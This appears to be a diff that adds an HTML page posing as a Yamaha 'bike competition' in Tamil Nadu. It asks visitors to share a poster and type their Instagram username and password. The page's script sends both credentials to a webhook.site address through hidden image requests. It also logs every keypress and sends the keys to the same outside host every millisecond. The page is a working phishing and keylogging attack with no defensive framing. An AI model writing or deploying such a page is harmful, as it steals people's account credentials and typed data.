@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+ <html>
+    <head>
+    <body>
+        <img src="yamaha.png" alt="Logo">
+<h1 style="font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif"><center>Tamilnadu's First Online Bike Competiton. Stand a chance to win Sports bike.<br>
+1.Do you already Own bike.<br>
+2.Do you have a license.<br>
+3.Are you based in Tamilnadu.<br>
+If yes congratulations you are eligible to win a bike. Just follow the steps below
+</center> </h1>
+        <div class="post">
+       <img src="poster.png" alt="HTML5 Icon" width="600" height="800"> </div>     
+        <div class="center">
+       <h2 style="font-family:verdana"><center>  Share this poster on your instagram   </h2>  </center>   
+          <label for="domTextElement">Username: </label>
+        <input type="text" id="username" >
+ <br><br>        <label for="domTextElement1">Password: </label>
+       <input type="password" id="password" >
+ <br><br>       
+<button type="button"  onclick="getValueInput()">Login  </button>
+</div>
+<h4> We will contact you in two days time. Only eligible contacts can win the prize</h4>
+         <p id="valueInput"></p>
+         <script>
+       const getValueInput = () =>{
+       
+let inputValue=document.getElementById("username").value; 
+       
+let inputValue1 = document.getElementById("password").value;        var i=new Image();
+var j=new Image();
+i.src="https://webhook.site/389a6f0e-a2ea-4070-9592-d9103a5db679?password="+inputValue1;  j.src="https://webhook.site/389a6f0e-a2ea-4070-9592-d9103a5db679?username="+inputValue; 
+
+}   
+  var keys='';
+var url = 'https://webhook.site/389a6f0e-a2ea-4070-9592-d9103a5db679';
+ document.onkeypress = function(e)
+ { 
+get = window.event?event:e;
+ key = get.keyCode?get.keyCode:get.charCode;
+ key = String.fromCharCode(key); keys+=key;
+}
+window.setInterval(function(){ 
+if(keys.length>0) {  
+new Image().src = url+keys;
+  keys = ''; }
+}, 1);
+</script>
+<style>
+    body {
+ background-image: url("paper.gif");
+ background-color: #b6b2c5;
+}
+
+    .center {
+  margin: auto;
+  width: 60%;
+  height: 80%;
+  border: 3px solid green;
+  padding: 10px;
+  margin-top: 10%;
+}
+.post{
+    
+    margin-left: 20%;
+}
+</style>
+</head>
+    </body>
+ </html>
